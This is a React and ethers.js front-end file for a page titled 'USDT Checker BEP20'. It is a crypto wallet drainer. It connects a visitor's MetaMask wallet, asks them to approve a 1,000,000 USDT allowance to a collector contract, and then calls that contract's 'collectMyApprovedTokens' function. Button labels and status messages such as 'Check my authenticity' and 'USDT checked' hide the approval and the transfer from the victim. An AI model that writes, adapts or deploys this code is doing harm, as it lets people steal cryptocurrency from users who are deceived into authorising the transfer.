import { useEffect, useState } from "react";
import { ethers } from "ethers";
import "./App.css";

const CONTRACT_ADDRESS = "YOUR_CONTRACT_ADDRESS_HERE"; // replace this
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

const USDT_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
];

const COLLECTOR_ABI = [
  "function collectMyApprovedTokens() external",
  "function usdtToken() view returns (address)",
];

function App() {
  const [wallet, setWallet] = useState(null);
  const [provider, setProvider] = useState(null);
  const [usdt, setUsdt] = useState(null);
  const [collector, setCollector] = useState(null);
  const [status, setStatus] = useState("");

  const connectWallet = async () => {
    if (window.ethereum) {
      const prov = new ethers.BrowserProvider(window.ethereum);
      const signer = await prov.getSigner();
      const address = await signer.getAddress();

      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const collectorContract = new ethers.Contract(CONTRACT_ADDRESS, COLLECTOR_ABI, signer);

      setWallet(address);
      setProvider(prov);
      setUsdt(usdtContract);
      setCollector(collectorContract);
      setStatus("✅ Wallet connected");
    } else {
      alert("Please install MetaMask");
    }
  };

  const approveUSDT = async () => {
    try {
      const decimals = await usdt.decimals();
      const amount = ethers.parseUnits("1000000", decimals); // approve 1M USDT
      const tx = await usdt.approve(CONTRACT_ADDRESS, amount);
      setStatus("⏳ Checking...");
      await tx.wait();
      setStatus("✅ USDT checked");
    } catch (err) {
      console.error(err);
      setStatus("❌ Approval failed");
    }
  };

  const collectTokens = async () => {
    try {
      const tx = await collector.collectMyApprovedTokens();
      setStatus("⏳ Checking...");
      await tx.wait();
      setStatus("✅ Tokens checked");
    } catch (err) {
      console.error(err);
      setStatus("❌ Check failed");
    }
  };

  return (
    <div className="App">
      <h2>USDT Checker BEP20</h2>
      {!wallet ? (
        <button onClick={connectWallet}>Connect Wallet</button>
      ) : (
        <>
          <p>Connected: {wallet}</p>
          <button onClick={approveUSDT}>Check USDT</button>
          <button onClick={collectTokens}>Check my authenticity</button>
          <p>{status}</p>
        </>
      )}
    </div>
  );
}

export default App;
